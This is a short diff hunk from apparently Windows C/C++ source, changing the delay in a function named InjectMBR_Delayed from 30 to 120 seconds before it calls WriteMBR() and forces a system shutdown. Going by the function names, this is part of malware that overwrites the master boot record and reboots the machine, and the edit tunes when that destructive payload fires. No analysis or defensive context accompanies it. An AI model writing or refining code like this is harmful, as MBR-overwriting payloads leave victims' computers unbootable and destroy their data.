@@ -105,7 +105,7 @@ bool WriteMBR() {
 }
 
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
-    Sleep(30000);
+    Sleep(120000);
     
     if (WriteMBR()) {
         system("shutdown /s /t 5");
